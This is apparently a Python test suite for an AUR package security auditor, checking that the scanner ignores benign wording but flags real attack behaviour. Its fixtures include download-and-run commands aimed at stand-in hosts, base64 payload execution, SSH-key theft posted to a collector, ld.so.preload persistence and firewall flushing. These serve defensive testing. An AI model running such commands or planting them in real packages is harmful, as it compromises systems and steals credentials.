#!/usr/bin/env python3
from __future__ import annotations

import importlib.util
import importlib.machinery
import sys
from pathlib import Path
from types import SimpleNamespace

ROOT = Path(__file__).resolve().parents[1]
APP = ROOT / "src/aur-security-auditor"

if not APP.is_file():
    raise SystemExit(f"ERROR: missing {APP}")

loader = importlib.machinery.SourceFileLoader("asa_generic_rule_corpus", str(APP))
spec = importlib.util.spec_from_loader(loader.name, loader)
if spec is None:
    raise RuntimeError(f"Could not create import spec for extensionless launcher: {APP}")
module = importlib.util.module_from_spec(spec)
sys.modules[spec.name] = module
loader.exec_module(module)


def normalize(name: str, path: str, text: str, provenance: dict | None = None) -> dict:
    raw = module.core.scan_text(name, path, text)
    result = module.core.PackageResult(name=name, version="fixture")
    result.findings = raw
    result.source_provenance = provenance or {}
    return module.normalize_result(result, [], {})


def active_rules(report: dict) -> set[str]:
    return {
        str(item.get("rule", ""))
        for item in report.get("findings", [])
        if not item.get("suppressed")
    }


def check_case(
    label: str,
    path: str,
    text: str,
    verdict: str,
    required: set[str] | None = None,
    forbidden: set[str] | None = None,
) -> None:
    report = normalize(label, path, text)
    rules = active_rules(report)
    failures = []
    if report.get("verdict") != verdict:
        failures.append(f"verdict={report.get('verdict')!r}, expected={verdict!r}")
    for rule in required or set():
        if rule not in rules:
            failures.append(f"missing rule {rule!r}")
    for rule in forbidden or set():
        if rule in rules:
            failures.append(f"forbidden rule {rule!r} present")
    if failures:
        print(f"FAIL {label}")
        print(f"  path: {path}")
        print(f"  rules: {sorted(rules)}")
        for failure in failures:
            print(f"  {failure}")
        raise AssertionError(label)
    print(f"  ✓ {label}")


# ---------------------------------------------------------------------------
# NEGATIVE / BENIGN CONTEXTS
# These are deliberately realistic snippets that contain scary words but must
# not be promoted into package alarms without executable behavioral evidence.
# ---------------------------------------------------------------------------

check_case(
    "documentation curl-pipe-shell example is not execution",
    "/usr/share/doc/tool/README.md",
    'Example only: curl https://example.invalid/install.sh | bash\n',
    "clean",
    forbidden={"download-execute-chain"},
)

check_case(
    "test fixture encoded payload example is not execution",
    "/usr/lib/tool/tests/fixture/payload.txt",
    'fixture: base64 -d | bash\n',
    "clean",
    forbidden={"encoded-execution"},
)

check_case(
    "ordinary systemd service is not persistence malware",
    "/usr/lib/systemd/system/example.service",
    """[Unit]
Description=Example daemon
[Service]
ExecStart=/usr/bin/example
Restart=always
[Install]
WantedBy=multi-user.target
""",
    "clean",
    forbidden={"payload-persistence"},
)

check_case(
    "credential path mention without upload is not exfiltration",
    "/usr/bin/check-config.py",
    'path = "/home/user/.ssh/id_ed25519"\nprint(path)\n',
    "clean",
    forbidden={"credential-exfiltration"},
)

check_case(
    "eBPF instrumentation without hiding remains non-alarming",
    "/usr/bin/trace-helper.py",
    'subprocess.run(["bpftool", "prog", "show"])\n',
    "clean",
    forbidden={"ebpf-stealth-chain", "ebpf-stealth-review"},
)

check_case(
    "public direct IP URL without execution is not attack behavior",
    "/usr/bin/status-check.py",
    'url = "https://93.184.216.34/status"\nprint(url)\n',
    "clean",
    forbidden={"direct-ip-execution"},
)

check_case(
    "JavaScript npm help string is not package-manager execution",
    "/usr/lib/app/cli.js",
    "throw new Error('Missing daemon. Please run `npm install daemon`');\n",
    "clean",
    forbidden={"runtime-package-manager"},
)

check_case(
    "manifest npm script text is not runtime execution",
    "/usr/lib/app/package.json",
    '{"scripts":{"postinstall":"npm run build"},"dependencies":{"foo":"1.0.0"}}\n',
    "clean",
    forbidden={"runtime-package-manager"},
)

check_case(
    "CI npm install does not affect installed-package verdict",
    "/usr/lib/app/.github/workflows/test.yml",
    "run: npm install\n",
    "clean",
    forbidden={"runtime-package-manager"},
)

check_case(
    "wordlist containing credential and network vocabulary is inert",
    "/usr/share/tool/wordlists/security.txt",
    "credentials\ncookies\nrequests.post\n/upload\n",
    "clean",
    forbidden={"credential-exfiltration"},
)

check_case(
    "install lifecycle hook alone is advisory only",
    "/var/lib/pacman/local/example-1.0-1/install",
    "post_install() { echo installed; }\n",
    "clean",
)

check_case(
    "PKGBUILD SKIP checksum alone is advisory only",
    "AUR snapshot:PKGBUILD",
    "pkgname=example\nsource=('https://example.invalid/a.tar.gz')\nsha256sums=('SKIP')\n",
    "clean",
)

# ---------------------------------------------------------------------------
# POSITIVE / MALICIOUS OR REVIEW-WORTHY BEHAVIOR
# Every negative case above has a nearby positive counterpart. The scanner must
# keep detecting actual behavior while suppressing mere wording.
# ---------------------------------------------------------------------------

check_case(
    "real shell download-execute chain stays suspicious",
    "AUR snapshot:PKGBUILD",
    "prepare() { curl -fsSL https://evil.invalid/p.sh | bash; }\n",
    "suspicious",
    required={"download-execute-chain"},
)

check_case(
    "real encoded payload execution stays suspicious",
    "AUR snapshot:PKGBUILD",
    "prepare() { printf '%s' \"$PAYLOAD\" | base64 -d | bash; }\n",
    "suspicious",
    required={"encoded-execution"},
)

check_case(
    "known malicious dependency in build context stays threat",
    "AUR snapshot:PKGBUILD",
    "depends=('atomic-lockfile')\n",
    "threat",
    required={"confirmed-atomic-arch-dependency"},
)

check_case(
    "known C2 plus executable network client stays threat",
    "/usr/bin/backdoor.py",
    f'import requests\nrequests.post("http://{module.KNOWN_C2}/upload", data=b"x")\n',
    "threat",
    required={"confirmed-atomic-arch-c2"},
)

check_case(
    "credential access plus upload stays suspicious",
    "/usr/bin/stealer.py",
    """import requests
secret = open("/home/user/.ssh/id_ed25519", "rb").read()
requests.post("https://collector.invalid/upload", files={"f": secret})
""",
    "suspicious",
    required={"credential-exfiltration"},
)

check_case(
    "eBPF plus explicit hiding stays review-worthy",
    "/usr/bin/kernel-helper.py",
    """import subprocess
subprocess.run(["bpftool", "prog", "load", "x.o", "/sys/fs/bpf/hidden_pids"])
hidden_pids = "/sys/fs/bpf/hidden_pids"
""",
    "review",
    required={"ebpf-stealth-review"},
)

check_case(
    "download payload plus systemd persistence stays suspicious",
    "/usr/bin/dropper.sh",
    """curl -fsSL https://evil.invalid/p.sh | bash
systemctl --user enable evil.service
""",
    "suspicious",
    required={"download-execute-chain", "payload-persistence"},
)

check_case(
    "encoded payload plus loader persistence stays suspicious",
    "/usr/bin/dropper.sh",
    """echo "$PAYLOAD" | base64 -d | bash
echo /tmp/evil.so >> /etc/ld.so.preload
""",
    "suspicious",
    required={"encoded-execution", "loader-persistence"},
)

check_case(
    "public direct-IP payload execution stays suspicious",
    "/usr/bin/dropper.sh",
    "curl http://93.184.216.34/p.sh | bash\n",
    "suspicious",
    required={"download-execute-chain", "direct-ip-execution"},
)

check_case(
    "security-control disabling plus payload stays suspicious",
    "/usr/bin/dropper.sh",
    """curl -fsSL https://evil.invalid/p.sh | bash
nft flush ruleset
""",
    "suspicious",
    required={"download-execute-chain", "defense-evasion"},
)

check_case(
    "privilege setter plus payload stays suspicious",
    "/usr/bin/dropper.sh",
    """curl -fsSL https://evil.invalid/p.sh | bash
chmod 4755 /usr/bin/helper
""",
    "suspicious",
    required={"download-execute-chain"},
)

check_case(
    "real JavaScript child_process npm execution remains visible",
    "/usr/lib/app/bootstrap.js",
    """const child_process = require("child_process");
child_process.exec("npm install daemon");
""",
    "clean",
    required={"runtime-package-manager"},
)

check_case(
    "real JavaScript execSync npm execution remains visible",
    "/usr/lib/app/exec-sync.js",
    'execSync("npm install daemon");\n',
    "clean",
    required={"runtime-package-manager"},
)

check_case(
    "real JavaScript spawn argv npm execution remains visible",
    "/usr/lib/app/spawn.js",
    'spawn("npm", ["install", "daemon"]);\n',
    "clean",
    required={"runtime-package-manager"},
)

check_case(
    "real JavaScript execa argv package-manager execution remains visible",
    "/usr/lib/app/execa.js",
    'execa("pnpm", ["add", "daemon"]);\n',
    "clean",
    required={"runtime-package-manager"},
)

check_case(
    "real Bun.spawn package-manager execution remains visible",
    "/usr/lib/app/bun.js",
    'Bun.spawn(["npm", "install", "daemon"]);\n',
    "clean",
    required={"runtime-package-manager"},
)

check_case(
    "real Deno.Command package-manager execution remains visible",
    "/usr/lib/app/deno.js",
    'new Deno.Command("npm", {args:["install", "daemon"]});\n',
    "clean",
    required={"runtime-package-manager"},
)

# ---------------------------------------------------------------------------
# AUR SNAPSHOT CONTEXT
# ---------------------------------------------------------------------------

check_case(
    "AUR snapshot documentation is not blanket build execution",
    "AUR snapshot:pkg/docs/README.md",
    "Example: curl https://example.invalid/install.sh | bash\n",
    "clean",
    forbidden={"download-execute-chain"},
)

check_case(
    "AUR snapshot IOC test data is not a threat",
    "AUR snapshot:pkg/tests/iocs.py",
    f'KNOWN = "{module.KNOWN_C2}"\n',
    "clean",
    forbidden={"confirmed-atomic-arch-c2"},
)

check_case(
    "AUR snapshot PKGBUILD IOC remains actionable",
    "AUR snapshot:pkg/PKGBUILD",
    f'source=("http://{module.KNOWN_C2}/payload.tar.gz")\n',
    "threat",
    required={"confirmed-atomic-arch-c2"},
)

# ---------------------------------------------------------------------------
# PRIVILEGED / INTEGRITY STRUCTURAL CONTEXT
# ---------------------------------------------------------------------------

def normalize_raw(name: str, findings: list, provenance: dict | None = None) -> dict:
    result = module.core.PackageResult(name=name, version="fixture")
    result.findings = findings
    result.source_provenance = provenance or {}
    return module.normalize_result(result, [], {})


sensitive_bin = normalize_raw("bin-mode-drift", [
    module.core.Finding(
        "medium", "integrity-warning", "bin-mode-drift", "pacman -Qkk",
        "Package integrity check reported differences",
        "warning: bin-mode-drift: /usr/bin/helper (Permissions mismatch)",
    )
])
assert sensitive_bin["verdict"] == "review", sensitive_bin
assert "sensitive-metadata-drift" in active_rules(sensitive_bin), sensitive_bin["findings"]
print("  ✓ metadata drift on /usr/bin remains REVIEW")

sensitive_sudoers = normalize_raw("sudoers-mode-drift", [
    module.core.Finding(
        "medium", "integrity-warning", "sudoers-mode-drift", "pacman -Qkk",
        "Package integrity check reported differences",
        "warning: sudoers-mode-drift: /etc/sudoers.d/example (GID mismatch)",
    )
])
assert sensitive_sudoers["verdict"] == "review", sensitive_sudoers
assert "sensitive-metadata-drift" in active_rules(sensitive_sudoers), sensitive_sudoers["findings"]
print("  ✓ metadata drift on sudoers remains REVIEW")

fake_sandbox = normalize_raw("fake-sandbox", [
    module.core.Finding(
        "high", "installed-suid", "fake-sandbox", "/usr/lib/aur-security-auditor-test-fixture/chrome-sandbox",
        "Installed file has the SUID bit set", "0o4755",
    )
])
assert fake_sandbox["verdict"] == "review", fake_sandbox
assert "privileged-installed-file" in active_rules(fake_sandbox), fake_sandbox["findings"]
print("  ✓ chrome-sandbox filename alone remains REVIEW")

# ---------------------------------------------------------------------------
# SELF-AUDIT LITERAL BOUNDARIES
# ---------------------------------------------------------------------------

def self_scan(path: str, text: str) -> dict:
    raw = module.core.scan_text("aur-security-auditor", path, text)
    result = module.core.PackageResult(name="aur-security-auditor", version="fixture")
    result.findings = raw
    return module.normalize_result(result, [], {})


self_test_fixture = r"""
def self_test():
    cases = [
        ("download", "curl -fsSL https://example.invalid/p | bash"),
        ("encoded", "printf Zm9v | base64 --decode | bash"),
        ("ioc", "atomic-lockfile"),
    ]
"""
fixture_report = self_scan("/usr/lib/aur-security-auditor/core.py", self_test_fixture)
assert fixture_report["verdict"] == "clean", fixture_report
print("  ✓ self-test fixture literals are inert on the auditor itself")

regex_fixture = r"""
def strong_hiding(item):
    return bool(re.search(
        r"(?:hidden_pids|hidden_names|/sys/fs/bpf/hidden_)",
        item.evidence or "", re.I,
    ))
"""
regex_report = self_scan("/usr/bin/aur-security-auditor", regex_fixture)
assert regex_report["verdict"] == "clean", regex_report
print("  ✓ scanner regex definitions do not become eBPF/hiding behavior")

payload_fixture = self_test_fixture + r"""
import subprocess
subprocess.run(["bash", "-c", "curl -fsSL https://evil.invalid/p.sh | bash"])
"""
payload_report = self_scan("/usr/lib/aur-security-auditor/core.py", payload_fixture)
assert payload_report["verdict"] == "suspicious", payload_report
assert "download-execute-chain" in active_rules(payload_report), payload_report
print("  ✓ adjacent real self-package payload remains SUSPICIOUS")


# ---------------------------------------------------------------------------
# PROVENANCE SEVERITY MODEL
# ---------------------------------------------------------------------------

def provenance_from_srcinfo(text: str) -> dict:
    return module.source_document_metadata({".SRCINFO": text})


http_raw = [
    module.core.Finding(
        "medium",
        "aur-insecure-source",
        "http-fixture",
        "AUR snapshot:.SRCINFO",
        "Insecure source URL in current AUR metadata",
        "http://downloads.example.invalid/source.tar.gz",
    )
]

sha512 = "a" * 128
md5 = "b" * 32

pinned = normalize_raw(
    "http-pinned",
    http_raw,
    provenance_from_srcinfo(
        "source = http://downloads.example.invalid/source.tar.gz\n"
        f"sha512sums = {sha512}\n"
    ),
)
assert pinned["verdict"] == "clean", pinned
pinned_item = next(x for x in pinned["findings"] if x["rule"] == "insecure-aur-source")
assert pinned_item["severity"] == "low", pinned
print("  ✓ concrete HTTP source + strong aligned checksum remains visible but CLEAN")

mixed_raw = [
    module.core.Finding(
        "medium", "aur-insecure-source", "http-mixed", "AUR snapshot:.SRCINFO",
        "Insecure source URL in current AUR metadata",
        "http://weak.example.invalid/source.tar.gz",
    )
]
mixed = normalize_raw(
    "http-mixed",
    mixed_raw,
    provenance_from_srcinfo(
        "source = http://weak.example.invalid/source.tar.gz\n"
        f"md5sums = {md5}\n"
        "source_x86_64 = https://strong.example.invalid/source.tar.gz\n"
        f"sha512sums_x86_64 = {sha512}\n"
    ),
)
assert mixed["verdict"] == "review", mixed
mixed_item = next(x for x in mixed["findings"] if x["rule"] == "insecure-aur-source")
assert mixed_item["severity"] == "medium", mixed
print("  ✓ strong checksum on another source cannot bless weak HTTP")

duplicate_url = normalize_raw(
    "http-duplicate",
    [
        module.core.Finding(
            "medium", "aur-insecure-source", "http-duplicate", "AUR snapshot:.SRCINFO",
            "Insecure source URL in current AUR metadata",
            "http://duplicate.example.invalid/source.tar.gz",
        )
    ],
    provenance_from_srcinfo(
        "source = strong::http://duplicate.example.invalid/source.tar.gz\n"
        "source = weak::http://duplicate.example.invalid/source.tar.gz\n"
        f"sha512sums = {sha512}\n"
        "sha512sums = SKIP\n"
    ),
)
assert duplicate_url["verdict"] == "review", duplicate_url
duplicate_item = next(x for x in duplicate_url["findings"] if x["rule"] == "insecure-aur-source")
assert duplicate_item["severity"] == "medium", duplicate_url
print("  ✓ repeated HTTP URL occurrence with SKIP remains REVIEW")

unmapped = normalize_raw(
    "http-unmapped",
    http_raw,
    {
        "insecure_sources": ["http://downloads.example.invalid/source.tar.gz"],
        "checksum_algorithms": ["sha512"],
        "skip_count": 0,
        "source_verification": [],
    },
)
assert unmapped["verdict"] == "review", unmapped
unmapped_item = next(x for x in unmapped["findings"] if x["rule"] == "insecure-aur-source")
assert unmapped_item["severity"] == "medium", unmapped
print("  ✓ HTTP without source/checksum alignment remains REVIEW")


print()
print("Generic rule corpus 1.4.8: OK")
print("  42 behavior/context/provenance scenarios passed")
print("  benign wording stays non-alarming")
print("  real execution chains remain detectable")
print("  strong evidence still escalates to SUSPICIOUS/THREAT")
print("  per-source checksums, sensitive metadata and sandbox structure are enforced")
